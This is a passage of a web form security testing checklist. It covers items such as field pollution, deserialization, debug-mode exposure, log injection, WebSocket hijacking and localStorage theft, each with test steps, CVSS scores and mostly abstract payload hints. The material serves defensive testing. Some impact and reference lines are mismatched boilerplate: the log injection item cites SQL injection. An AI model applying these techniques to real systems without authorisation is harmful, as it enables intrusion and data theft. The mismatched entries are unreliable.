## FORM-224 — Form Field Pollution
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Submit extra unexpected fields 2. Backend processes all 3. Modify unintended data 4. Data corruption

**Expected Result:** Only expected fields should be processed

**Payload Example:**

```
Add extra fields not in form
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## FORM-225 — Form State Deserialization
**Test Category:** Insecure Deserialization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form state serialized 2. Modify serialized state 3. Deserialize modified 4. Code execution

**Expected Result:** Deserialization should be safe

**Payload Example:**

```
Modified viewstate or serialized form data
```

**Impact:** Insecure deserialization -&gt; remote code execution.

**Tools:** ysoserial / Burp Suite

**References:** CWE-502; -&gt;[Insecure Deserialization checklist](#/checklist/deser); Bechler 'Java Unmarshaller Security'; ysoserial

---

## FORM-226 — Form Error Message Disclosure
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Submit invalid data 2. Analyze error messages 3. Extract system info 4. Reconnaissance

**Expected Result:** Errors should be generic

**Payload Example:**

```
Stack traces or DB errors in response
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Error Analysis

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FORM-227 — Form Debug Mode Exposure
**Test Category:** Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Find debug parameters 2. Enable debug mode 3. View debug info 4. System exposure

**Expected Result:** Debug should be disabled in production

**Payload Example:**

```
?debug=true or ?verbose=1
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Param Discovery

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FORM-228 — Form Log Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Submit form with log payload 2. Data logged 3. Log injection 4. Log tampering

**Expected Result:** Logs should sanitize user input

**Payload Example:**

```
input=valid\nFake log entry injected
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Log Analysis

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-229 — Form GraphQL Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form uses GraphQL 2. Inject GraphQL query 3. Extract unauthorized data 4. Data breach

**Expected Result:** GraphQL should validate queries

**Payload Example:**

```
GraphQL query injection in form field
```

**Impact:** GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability.

**Tools:** GraphQL Tools / Burp Suite

**References:** CWE-400; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger

---

## FORM-230 — Form WebSocket Hijacking
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form uses WebSocket 2. Hijack WS connection 3. Submit as another user 4. Impersonation

**Expected Result:** WebSocket should verify user

**Payload Example:**

```
Cross-site WebSocket hijacking
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / WS King

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-231 — Form Service Worker Interception
**Test Category:** Man-in-the-Middle · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Malicious service worker 2. Intercept form submissions 3. Steal data 4. Data theft

**Expected Result:** Service workers should be controlled

**Payload Example:**

```
Inject malicious service worker
```

**Impact:** Credentials/tokens over cleartext -&gt; network interception -&gt; account takeover.

**Tools:** Browser DevTools / Custom Scripts

**References:** CWE-319; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-01

---

## FORM-232 — Form Local Storage Theft
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form data in localStorage 2. XSS accesses localStorage 3. Data stolen 4. Privacy violation

**Expected Result:** Sensitive data should not be in localStorage

**Payload Example:**

```
localStorage.getItem('form_data') via XSS
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** XSS Hunter / Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FORM-233 — Form IndexedDB Exposure
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form data in IndexedDB 2. Access IndexedDB 3. Extract sensitive data 4. Privacy violation

**Expected Result:** IndexedDB should be protected

**Payload Example:**

```
Access IndexedDB via browser or XSS
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools / Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FORM-234 — Form Print Preview Leak
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form has print function 2. Print preview shows hidden data 3. Data exposed 4. Information disclosure

**Expected Result:** Print should respect field visibility

**Payload Example:**

```
Hidden fields visible in print
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools / Manual Testing

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FORM-235 — Form Accessibility Feature Abuse
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Screen reader enabled 2. Hidden fields read aloud 3. Sensitive data exposed 4. Privacy violation

**Expected Result:** Hidden fields should use proper attributes

**Payload Example:**

```
aria-hidden not properly set
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Screen Reader / Manual Testing

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FORM-236 — Form Progressive Enhancement Bypass
**Test Category:** Security Bypass · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. JavaScript security disabled 2. Submit basic HTML form 3. Bypass JS validations 4. Inject payload

**Expected Result:** Server should not rely on JS

**Payload Example:**

```
Submit form with JavaScript disabled
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / NoScript

**References:** CWE-840; PortSwigger Business logic

---

## FORM-237 — Form Shadow DOM Bypass
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form in Shadow DOM 2. Break shadow boundary 3. Access/modify form 4. XSS or tampering

**Expected Result:** Shadow DOM should be properly implemented

**Payload Example:**

```
Break shadow DOM encapsulation
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Browser DevTools / Custom Scripts

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FORM-238 — Form Memory Leak Exploitation
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form processes data 2. Memory not cleared 3. Extract from memory 4. Sensitive data exposure

**Expected Result:** Memory should be cleared after use

**Payload Example:**

```
Memory dump showing form data
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Memory Analysis Tools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---
